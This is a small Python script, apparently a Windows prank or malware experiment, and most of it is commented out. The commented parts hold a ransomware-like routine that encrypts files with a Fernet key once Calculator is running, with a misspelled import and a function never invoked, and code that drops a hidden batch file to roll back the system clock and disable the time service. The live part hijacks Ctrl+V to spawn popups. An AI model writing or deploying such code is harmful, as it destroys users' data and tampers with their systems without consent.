# import subprocess
# from cryptography.fernet import fernet 

# def Calculator():
#     s = subprocess.check_output('tasklist')
#     if "CalculatorApp.exe" in str(s):
#         def generar_key():
#             key = Fernet.generate_key()
#             with open('key.key', 'wb') as key_file:
#                 key_file.write(key)


#         def cargar_key():
#             return open('key.key', 'rb').read()

#         def encrypt(items, key):
#             f= Fernet(key)
#             for item in items:
#                 with open(item, 'rb') as file:
#                     file_data = file.read()
#                 encrypted_data = f.encrypt(file_data)
#                 with open(item, 'wb') as file:
#                     file.write(encrypted_data)

# Calculator()

# import os

# home_dir = os.path.expanduser("~")

# file_name = 'os.bat'

# if not os.path.exists(home_dir + '/os.bat'):
#     with open(os.path.join(home_dir, file_name), "w") as f:
#         f.write("@echo off\npowershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "Get-Date | ForEach-Object { $_.AddDays(-1) } | Set-Date"\npowershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "Set-Service w32time -StartupType Disabled")    

import keyboard
import threading
from Classes import popup as pp

def execute_program():
    p = pp.popupGenerator()
    threading.Thread(target=p.start_popups).start()
    print('x')

keyboard.add_hotkey('ctrl+v',execute_program)

keyboard.wait()
# import ctypes as cty

# c = cty.windll.user32.SystemParametersInfoA(0x0071,0,9,0x01|0x02)
# print(c)